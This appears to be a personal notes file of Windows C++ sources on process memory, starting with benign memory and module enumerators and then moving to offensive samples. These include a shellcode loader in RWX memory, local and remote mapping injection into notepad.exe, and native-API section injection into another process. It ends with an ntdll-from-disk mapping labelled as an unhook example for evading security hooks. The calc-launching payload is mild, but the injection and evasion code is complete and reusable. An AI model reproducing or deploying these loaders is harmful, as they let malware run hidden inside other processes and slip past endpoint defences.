# Source codes
## Mem Stats
```cpp
/* Memory enumerator
   https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing
   Forrest Orr - 2019
   forrest.orr@protonmail.com
   Licensed under GNU GPLv3 */

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <list>
#ifdef _WIN64
#pragma pack(push, 8) // Bug fix for strange x64 bug, sizeof PROCESSENTRY struct in 64-bit is unaligned and will break Process32First, with error code ERROR_BAD_LENGTH
#include <Tlhelp32.h>
#pragma pack(pop)
#else
#include <Tlhelp32.h>
#endif

using namespace std;

list<MEMORY_BASIC_INFORMATION*> QueryProcessMem(uint32_t dwPid) {
	list<MEMORY_BASIC_INFORMATION*> ProcessMem;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, dwPid);

	if (hProcess != nullptr) {
		MEMORY_BASIC_INFORMATION* pMemInfo = nullptr;

		for (uint8_t* p = nullptr;; p += pMemInfo->RegionSize) {
			pMemInfo = new MEMORY_BASIC_INFORMATION;

			if (VirtualQueryEx(hProcess, p, pMemInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {
				ProcessMem.push_back(pMemInfo);
			}
			else {
				delete pMemInfo;
				break;
			}
		}

		CloseHandle(hProcess);
	}

	return ProcessMem;
}

void EnumProcessMem(uint32_t dwTargetPid, uint8_t* pBaseAddress = (uint8_t*)0x00400000) {
	list<MEMORY_BASIC_INFORMATION*> ProcessMem = QueryProcessMem(dwTargetPid);

	for (list<MEMORY_BASIC_INFORMATION*>::const_iterator i = ProcessMem.begin(); i != ProcessMem.end(); ++i) {
		if (pBaseAddress == (uint8_t*)-1 || (*i)->AllocationBase == (void*)pBaseAddress) {
			printf(
				"0x%p\r\n"
				"  Base: 0x%p\r\n"
				"  Size: %d\r\n",
				(*i)->AllocationBase,
				(*i)->BaseAddress,
				(*i)->RegionSize);

			printf("  State: ");
			switch ((*i)->State)
			{
			case MEM_COMMIT:
				printf("MEM_COMMIT\r\n");
				break;
			case MEM_RESERVE:
				printf("MEM_RESERVE\r\n");
				break;
			case MEM_FREE:
				printf("MEM_FREE\r\n");
				break;
			default:
				printf("Invalid?\r\n");
			}

			printf("  Type: ");
			switch ((*i)->Type)
			{
			case MEM_IMAGE:
				printf("MEM_IMAGE\r\n");
				break;
			case MEM_MAPPED:
				printf("MEM_MAPPED\r\n");
				break;
			case MEM_PRIVATE:
				printf("MEM_PRIVATE\r\n");
				break;
			default:
				printf("Invalid?\r\n");
			}

			printf("  Current permissions: 0x%08x\r\n", (*i)->Protect);
			printf("  Original permissions: 0x%08x\r\n", (*i)->AllocationProtect);
		}
	}
}

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	if (nArgc < 3) {
		printf("* Usage: %ws [PID \"current\" or \"all\" to scan all processes] [\"enum\" to output details or \"stats\" to give statistics]\r\n", pArgv[0]);
	}
	else {
		bool bScanAll = false, bStats = false;
		uint32_t dwPid = GetCurrentProcessId();

		if (_wcsicmp(pArgv[1], L"all") == 0) {
			bScanAll = true;
		}
		else if (_wcsicmp(pArgv[1], L"current") != 0) {
			dwPid = _wtoi(pArgv[1]);
		}
		if (_wcsicmp(pArgv[2], L"stats") == 0) {
			bStats = true;
		}

		if (!bScanAll) {
			if (!bStats) {
				EnumProcessMem(dwPid, (uint8_t*)-1);
			}
			else {
				//
			}
		}
		else {
			PROCESSENTRY32W ProcEntry = { 0 };
			HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			list<MEMORY_BASIC_INFORMATION*> ImageMem, MapMem, PrivateMem;

			if (hSnapshot != nullptr)
			{
				ProcEntry.dwSize = sizeof(PROCESSENTRY32W);

				if (Process32FirstW(hSnapshot, &ProcEntry))
				{
					do
					{
						if (!bStats) {
							EnumProcessMem(ProcEntry.th32ProcessID, (uint8_t*)-1);
						}
						else {
							list<MEMORY_BASIC_INFORMATION*> ProcessMem = QueryProcessMem(ProcEntry.th32ProcessID);

							for (list<MEMORY_BASIC_INFORMATION*>::const_iterator i = ProcessMem.begin(); i != ProcessMem.end(); ++i) {
								if ((*i)->Type == MEM_IMAGE) {
									ImageMem.push_back(*i);
								}
								else if ((*i)->Type == MEM_MAPPED) {
									MapMem.push_back(*i);
								}
								else if ((*i)->Type == MEM_PRIVATE) {
									PrivateMem.push_back(*i);
								}
							}
						}
					} while (Process32NextW(hSnapshot, &ProcEntry));
				}

				CloseHandle(hSnapshot);
			}
			else
			{
				printf("- Failed to create process list snapshot (error %d)\r\n", GetLastError());
			}

			list<MEMORY_BASIC_INFORMATION*> Readonly, ReadWrite, ReadExec, ReadWriteExec, ExecWriteCopy, WriteCopy, Exec;

			for (list<MEMORY_BASIC_INFORMATION*>::const_iterator i = ImageMem.begin(); i != ImageMem.end(); ++i) {
				switch ((*i)->Protect) {
				case PAGE_READONLY:
					Readonly.push_back(*i);
					break;
				case PAGE_READWRITE:
					ReadWrite.push_back(*i);
					break;
				case PAGE_EXECUTE_READ:
					ReadExec.push_back(*i);
					break;
				case PAGE_EXECUTE_READWRITE:
					ReadWriteExec.push_back(*i);
					break;
				case PAGE_EXECUTE_WRITECOPY:
					ExecWriteCopy.push_back(*i);
					break;
				case PAGE_WRITECOPY:
					WriteCopy.push_back(*i);
					break;
				case PAGE_EXECUTE:
					Exec.push_back(*i);
					break;
				default: break;
				}
			}

			printf("~ Image memory (%d total):\r\n", ImageMem.size());
			printf("  PAGE_READONLY: %d (%f%%)\r\n", Readonly.size(), (float)Readonly.size() / ImageMem.size() * 100.0);
			printf("  PAGE_READWRITE: %d (%f%%)\r\n", ReadWrite.size(), (float)ReadWrite.size() / ImageMem.size() * 100.0);
			printf("  PAGE_EXECUTE_READ: %d (%f%%)\r\n", ReadExec.size(), (float)ReadExec.size() / ImageMem.size() * 100.0);
			printf("  PAGE_EXECUTE_READWRITE: %d (%f%%)\r\n", ReadWriteExec.size(), (float)ReadWriteExec.size() / ImageMem.size() * 100.0);
			printf("  PAGE_EXECUTE_WRITECOPY: %d (%f%%)\r\n", ExecWriteCopy.size(), (float)ExecWriteCopy.size() / ImageMem.size() * 100.0);
			printf("  PAGE_WRITECOPY: %d (%f%%)\r\n", WriteCopy.size(), (float)WriteCopy.size() / ImageMem.size() * 100.0);
			printf("  PAGE_EXECUTE: %d (%f%%)\r\n", Exec.size(), (float)Exec.size() / ImageMem.size() * 100.0);

			Readonly.clear();
			ReadWrite.clear();
			ReadExec.clear();
			ReadWriteExec.clear();
			ExecWriteCopy.clear();
			WriteCopy.clear();
			Exec.clear();

			for (list<MEMORY_BASIC_INFORMATION*>::const_iterator i = MapMem.begin(); i != MapMem.end(); ++i) {
				switch ((*i)->Protect) {
				case PAGE_READONLY:
					Readonly.push_back(*i);
					break;
				case PAGE_READWRITE:
					ReadWrite.push_back(*i);
					break;
				case PAGE_EXECUTE_READ:
					ReadExec.push_back(*i);
					break;
				case PAGE_EXECUTE_READWRITE:
					ReadWriteExec.push_back(*i);
					break;
				case PAGE_EXECUTE_WRITECOPY:
					ExecWriteCopy.push_back(*i);
					break;
				case PAGE_WRITECOPY:
					WriteCopy.push_back(*i);
					break;
				case PAGE_EXECUTE:
					Exec.push_back(*i);
					break;
				default: break;
				}
			}

			printf("~ Mapped memory (%d total):\r\n", MapMem.size());
			printf("  PAGE_READONLY: %d (%f%%)\r\n", Readonly.size(), (float)Readonly.size() / MapMem.size() * 100.0);
			printf("  PAGE_READWRITE: %d (%f%%)\r\n", ReadWrite.size(), (float)ReadWrite.size() / MapMem.size() * 100.0);
			printf("  PAGE_EXECUTE_READ: %d (%f%%)\r\n", ReadExec.size(), (float)ReadExec.size() / MapMem.size() * 100.0);
			printf("  PAGE_EXECUTE_READWRITE: %d (%f%%)\r\n", ReadWriteExec.size(), (float)ReadWriteExec.size() / MapMem.size() * 100.0);
			printf("  PAGE_EXECUTE_WRITECOPY: %d (%f%%)\r\n", ExecWriteCopy.size(), (float)ExecWriteCopy.size() / MapMem.size() * 100.0);
			printf("  PAGE_WRITECOPY: %d (%f%%)\r\n", WriteCopy.size(), (float)WriteCopy.size() / MapMem.size() * 100.0);
			printf("  PAGE_EXECUTE: %d (%f%%)\r\n", Exec.size(), (float)Exec.size() / MapMem.size() * 100.0);

			Readonly.clear();
			ReadWrite.clear();
			ReadExec.clear();
			ReadWriteExec.clear();
			ExecWriteCopy.clear();
			WriteCopy.clear();
			Exec.clear();

			for (list<MEMORY_BASIC_INFORMATION*>::const_iterator i = PrivateMem.begin(); i != PrivateMem.end(); ++i) {
				switch ((*i)->Protect) {
				case PAGE_READONLY:
					Readonly.push_back(*i);
					break;
				case PAGE_READWRITE:
					ReadWrite.push_back(*i);
					break;
				case PAGE_EXECUTE_READ:
					ReadExec.push_back(*i);
					break;
				case PAGE_EXECUTE_READWRITE:
					ReadWriteExec.push_back(*i);
					break;
				case PAGE_EXECUTE_WRITECOPY:
					ExecWriteCopy.push_back(*i);
					break;
				case PAGE_WRITECOPY:
					WriteCopy.push_back(*i);
					break;
				case PAGE_EXECUTE:
					Exec.push_back(*i);
					break;
				default: break;
				}
			}

			printf("~ Private memory (%d total):\r\n", PrivateMem.size());
			printf("  PAGE_READONLY: %d (%f%%)\r\n", Readonly.size(), (float)Readonly.size() / PrivateMem.size() * 100.0);
			printf("  PAGE_READWRITE: %d (%f%%)\r\n", ReadWrite.size(), (float)ReadWrite.size() / PrivateMem.size() * 100.0);
			printf("  PAGE_EXECUTE_READ: %d (%f%%)\r\n", ReadExec.size(), (float)ReadExec.size() / PrivateMem.size() * 100.0);
			printf("  PAGE_EXECUTE_READWRITE: %d (%f%%)\r\n", ReadWriteExec.size(), (float)ReadWriteExec.size() / PrivateMem.size() * 100.0);
			printf("  PAGE_EXECUTE_WRITECOPY: %d (%f%%)\r\n", ExecWriteCopy.size(), (float)ExecWriteCopy.size() / PrivateMem.size() * 100.0);
			printf("  PAGE_WRITECOPY: %d (%f%%)\r\n", WriteCopy.size(), (float)WriteCopy.size() / PrivateMem.size() * 100.0);
			printf("  PAGE_EXECUTE: %d (%f%%)\r\n", Exec.size(), (float)Exec.size() / PrivateMem.size() * 100.0);
		}
	}
}
```

## PEB View
```cpp
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

typedef NTSTATUS(NTAPI* fNtGetNextProcess)(
    _In_ HANDLE ph,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Flags,
    _Out_ PHANDLE Newph
    );

int listModulesOfProcess(int pid) {
    HANDLE ph;
    MEMORY_BASIC_INFORMATION mbi;
    char* base = NULL;

    ph = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (ph == NULL)
        return -1;

    printf("modules found:\n");
    printf("name\t\t\t base address\n");
    printf("=================================================================================\n");

    while (VirtualQueryEx(ph, base, &mbi, sizeof(mbi)) == sizeof(MEMORY_BASIC_INFORMATION)) {
        char szModName[MAX_PATH];

        if ((mbi.AllocationBase == mbi.BaseAddress) && (mbi.AllocationBase != NULL)) {
            if (GetModuleFileNameExA(ph, (HMODULE)mbi.AllocationBase, (LPSTR)szModName, sizeof(szModName) / sizeof(TCHAR)))
                printf("%#25s\t\t%#10llx\n", szModName, (unsigned long long)mbi.AllocationBase);
        }
        base += mbi.RegionSize;
    }

    CloseHandle(ph);
    return 0;
}

int main(int argc, char* argv[]) {
    int pid = atoi(argv[1]);
    printf("%s%d\n", pid > 0 ? "process found at pid = " : "process not found. pid = ", pid);
    if (pid != 0)
        listModulesOfProcess(pid);
    return 0;
}
```

## Private
Calc x64 shellcode (really :D)
```cpp
#include <windows.h>
using namespace std;

int main() {
    char shellcode[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

## Mapped
### Map view of file
```cpp
#include <windows.h>

int main()
{
    SIZE_T memorySize = 100;
    HANDLE hFileMap;
    LPVOID mMappedMemory;

    HANDLE hFile = CreateFile(
        TEXT("temp_file.xyz"),
        GENERIC_READ | GENERIC_WRITE,
        0, 
        NULL, 
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    hFileMap = CreateFileMapping(
        hFile, 
        NULL, 
        PAGE_READWRITE, 
        0, 
        memorySize, 
        NULL);

    if (hFileMap == NULL)
    { 
        return 2;
    }

    mMappedMemory = MapViewOfFile(hFileMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, memorySize);
    if (mMappedMemory == NULL)
    { 
        return 3;
    }
    CloseHandle(hFile);
    CloseHandle(hFileMap);

    return 0;
}
```

### Local Mapping Injection
```cpp
#include <windows.h>
#include <stdio.h>

BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL   bSTATE = TRUE;
	HANDLE hFile = NULL;
	PVOID  pMapAddress = NULL;

	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	memcpy(pMapAddress, pPayload, sPayloadSize);

_EndOfFunction:
	*ppAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}


int main() {
	
	BYTE shellcode[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
		"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
		"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
		"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
		"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
		"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
		"\x48\x83\xec\x20\x41\xff\xd6,\x00";

	PVOID shellcodeaddr = nullptr;
	LocalMapInject(shellcode, sizeof(shellcode), &shellcodeaddr);

	HANDLE hproc = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)shellcodeaddr, NULL, NULL, NULL);
	WaitForSingleObject(hproc, INFINITE);
	return 0;
}
```

### Remote Mapping Injection
```cpp
#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#pragma comment(lib, "onecore.lib")

BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL        bSTATE = TRUE;
	HANDLE      hFile = NULL;
	PVOID       pMapLocalAddress = NULL,
		pMapRemoteAddress = NULL;

	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}
DWORD GetNotePadPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_wcsicmp(entry.szExeFile, L"notepad.exe") == 0)
			{
				return entry.th32ProcessID;
			}
		}
	}
	return 0;
}

int main() {
	
	BYTE shellcode[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
		"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
		"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
		"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
		"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
		"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
		"\x48\x83\xec\x20\x41\xff\xd6,\x00";

	PVOID shellcodeaddr = nullptr;
	DWORD notepadpid = GetNotePadPid();
	HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION, FALSE, notepadpid);
	RemoteMapInject(hProc, shellcode, sizeof(shellcode), &shellcodeaddr);

	HANDLE hproc = CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)shellcodeaddr, NULL, NULL, NULL);
	WaitForSingleObject(hproc, INFINITE);
	return 0;
}
```

### NtFunc Mapping Injection
```cpp
#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll")

typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES {	ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *PCLIENT_ID;
using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL); 
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle,	HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);

int main()
{
	unsigned char buf[] = "\xfc\xd5";
	
	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	
	// create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	
	// create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// create a view of the memory section in the target process
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, buf, sizeof(buf));
	
	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

	return 0;
}
```

### Instrumentation Callback
https://github.com/antonioCoco/Mapping-Injection
https://splintercod3.blogspot.com/p/weaponizing-mapping-injection-with.html
https://www.unknowncheats.me/forum/anti-cheat-bypass/253247-instrumentation-callbacks.html

## Image
### Memory Module
```cpp
github.com/fancycode/MemoryModule

github.com/bb107/MemoryModulePP

github.com/DarthTon/Blackbone <- With Injection
```

### CreateFileMapping
```cpp
#include <Windows.h>
#include <iostream>
int main()
{
    HANDLE hFile = CreateFile(TEXT("C:\\prog.exe"), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        CloseHandle(hFile);
        return 1;
    }

    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, dwFileSize, NULL);
    if (hMapping == NULL)
    {
        CloseHandle(hFile);
        return GetLastError();
    }

    LPVOID lpBaseAddress = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (lpBaseAddress == NULL)
    {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(lpBaseAddress, &mbi, sizeof(mbi));
    if (mbi.Type != MEM_IMAGE)
    {
        UnmapViewOfFile(lpBaseAddress);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }


    DWORD pid = GetCurrentProcessId();
    std::wcout << pid << std::endl;
    WaitForSingleObject((HANDLE) - 1, INFINITE);
    UnmapViewOfFile(lpBaseAddress);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return 0;
}
```

### NtCreateSection (SEC_IMAGE_NO_EXECUTE) 
Unhook example
```cpp
BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {

	HANDLE  hFile = NULL,
		hSection = NULL;
	CHAR    cWinPath[MAX_PATH / 2] = { 0 };
	CHAR    cNtdllPath[MAX_PATH] = { 0 };
	PBYTE   pNtdllBuffer = NULL;

	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

	hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
	if (hSection == NULL) {
		printf("[!] CreateFileMappingA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	pNtdllBuffer = (PBYTE)MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (pNtdllBuffer == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hFile)
		CloseHandle(hFile);
	if (hSection)
		CloseHandle(hSection);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}
```
